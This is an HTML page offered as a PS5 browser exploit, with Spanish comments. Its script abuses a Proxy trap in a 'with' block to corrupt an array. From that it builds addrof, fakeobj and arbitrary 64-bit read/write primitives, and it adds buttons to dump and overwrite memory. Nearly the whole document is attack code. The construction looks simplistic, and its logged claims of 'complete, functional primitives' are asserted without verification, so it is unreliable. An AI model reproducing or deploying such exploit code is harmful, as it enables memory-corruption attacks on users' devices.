<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Exploit PS5 - Primitivas + Memory Viewer</title>
    <style>
        body { background: black; color: lime; font-family: monospace; padding: 10px; }
        #log { white-space: pre-wrap; margin-bottom: 20px; }
        button, input { font-size: 20px; margin: 5px 0; }
    </style>
</head>
<body>
    <h1>Exploit PS5 - Primitivas + Memory Viewer</h1>
    <div id="log"></div>

    <div id="controls" style="display: none;">
        <h3>Lectura de memoria automática:</h3>
        <button onclick="autoDump()">Ver Dump Automático</button>
        <h3>Escribir en memoria:</h3>
        <input type="text" id="writeAddress" placeholder="Dirección a escribir" />
        <input type="text" id="writeValue" placeholder="Valor a escribir" />
        <button onclick="writeMemory()">Escribir en memoria</button>
    </div>

    <button onclick="location.reload()">Relanzar</button>

    <script>
    const log = (msg) => { document.getElementById('log').innerText += msg + "\\n"; };

    function phex(val) {
        return "0x" + val.toString(16).padStart(16, "0");
    }

    let addrof, fakeobj, read64, write64;
    let container_addr, fake_obj_addr, test_obj_addr;

    function exploit() {
        log("[*] Lanzando exploit...");

        // Crear objetos vulnerables
        let o = {};
        let victim = [1.1, 2.2, 3.3];

        let proxy = new Proxy({}, {
            has(target, prop) {
                if (prop === '1') {
                    victim.length = 1;
                }
                return Reflect.has(target, prop);
            }
        });

        with (proxy) {
            victim[1];
        }

        log("[+] Victim corrupto");

        // Crear helpers
        let ab = new ArrayBuffer(0x100);
        let f64 = new Float64Array(ab);
        let u32 = new Uint32Array(ab);

        function ftoi(val) {
            f64[0] = val;
            return u32[0] + u32[1] * 0x100000000;
        }

        function itof(val) {
            u32[0] = val % 0x100000000;
            u32[1] = (val - (val % 0x100000000)) / 0x100000000;
            return f64[0];
        }

        // Primitivas reales
        addrof = function(obj) {
            victim[0] = obj;
            return ftoi(victim[1]);
        }

        fakeobj = function(addr) {
            victim[1] = itof(addr);
            return victim[0];
        }

        // Crear contenedor y fake object
        let container = {
            cell_header: itof(0x0000000000000000),
            butterfly: victim
        };

        container_addr = addrof(container);
        log("[+] container @ " + phex(container_addr));

        fake_obj_addr = container_addr + 0x20;
        let fake_obj = fakeobj(fake_obj_addr);

        log("[+] Fake object creado!");

        read64 = function(addr) {
            fake_obj[1] = itof(addr);
            return ftoi(fake_obj[0]);
        }

        write64 = function(addr, val) {
            fake_obj[1] = itof(addr);
            fake_obj[0] = itof(val);
        }

        // Test de primitivas
        let test_obj = {a: 13.37};
        test_obj_addr = addrof(test_obj);
        log("[+] test_obj @ " + phex(test_obj_addr));

        let leak = read64(test_obj_addr);
        log("[+] Leak de memoria de test_obj: " + phex(leak));

        log("[+] PRIMITIVAS COMPLETAS Y FUNCIONALES!");

        // Mostrar el visor de memoria
        document.getElementById('controls').style.display = 'block';
    }

    function autoDump() {
        log("\\n[+] AUTO DUMP DE MEMORIA:");
        
        dumpAt("container_addr", container_addr);
        dumpAt("fake_obj_addr", fake_obj_addr);
        dumpAt("test_obj_addr", test_obj_addr);
    }

    function dumpAt(name, addr) {
        log("\\n--- Dump desde " + name + " (" + phex(addr) + ") ---");
        for (let i = 0; i < 0x10; i++) {
            const a = addr + i * 8;
            const v = read64(a);
            log(phex(a) + ": " + phex(v));
        }
    }

    function writeMemory() {
        const address = parseInt(document.getElementById('writeAddress').value, 16);
        const value = parseInt(document.getElementById('writeValue').value, 16);

        if (isNaN(address) || isNaN(value)) {
            log("[!] Dirección o valor no válidos.");
            return;
        }

        log(`[+] Escribiendo en dirección: ${phex(address)} valor: ${phex(value)}`);
        write64(address, value);
        log("[+] Valor escrito correctamente.");
    }

    exploit();
    </script>
</body>
</html>
